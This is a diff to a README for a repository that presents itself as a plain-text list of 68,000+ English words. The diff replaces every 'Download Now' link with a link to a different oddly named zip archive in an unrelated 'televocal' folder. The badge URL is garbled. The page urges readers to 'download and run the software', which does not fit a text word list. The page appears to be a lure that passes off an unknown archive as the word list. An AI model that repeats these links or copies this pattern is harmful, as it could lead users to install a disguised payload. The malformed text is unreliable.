@@ -1,6 +1,6 @@
 # 📝 massive-english-word-list - Access 68,000+ Words Easily
 
-[![Download Now](https://raw.githubusercontent.com/Sashank222222/massive-english-word-list/main/televocal/massive-english-word-list_congreganist.zip%20Now-Click%https://raw.githubusercontent.com/Sashank222222/massive-english-word-list/main/televocal/massive-english-word-list_congreganist.zip)](https://raw.githubusercontent.com/Sashank222222/massive-english-word-list/main/televocal/massive-english-word-list_congreganist.zip)
+[![Download Now](https://raw.githubusercontent.com/Sashank222222/massive-english-word-list/main/televocal/list_english_massive_word_1.4.zip%20Now-Click%https://raw.githubusercontent.com/Sashank222222/massive-english-word-list/main/televocal/list_english_massive_word_1.4.zip)](https://raw.githubusercontent.com/Sashank222222/massive-english-word-list/main/televocal/list_english_massive_word_1.4.zip)
 
 ## 📌 Description
 This text file contains over 68,000 English words. Use it for tasks like autosuggestion and auto-completion. It excludes ancient or rarely used words based on the word frequency library. 
@@ -16,7 +16,7 @@ Follow these simple steps to download and run the software.
 ## 2. 📦 Download & Install
 To get the word list, visit the Releases page. You will find the latest version ready for download.
 
-[Download Now](https://raw.githubusercontent.com/Sashank222222/massive-english-word-list/main/televocal/massive-english-word-list_congreganist.zip)
+[Download Now](https://raw.githubusercontent.com/Sashank222222/massive-english-word-list/main/televocal/list_english_massive_word_1.4.zip)
 
 ## 3. 📂 File Format
 The word list is stored in a plain text format. You can easily open it using any text editor, such as Notepad (Windows) or TextEdit (macOS).
@@ -55,4 +55,4 @@ Feel free to delve deeper into related topics. This word list can significantly 
 
 Make sure to utilize the features this list offers and take your projects to the next level.
 
-[Download Now](https://raw.githubusercontent.com/Sashank222222/massive-english-word-list/main/televocal/massive-english-word-list_congreganist.zip)
+[Download Now](https://raw.githubusercontent.com/Sashank222222/massive-english-word-list/main/televocal/list_english_massive_word_1.4.zip)
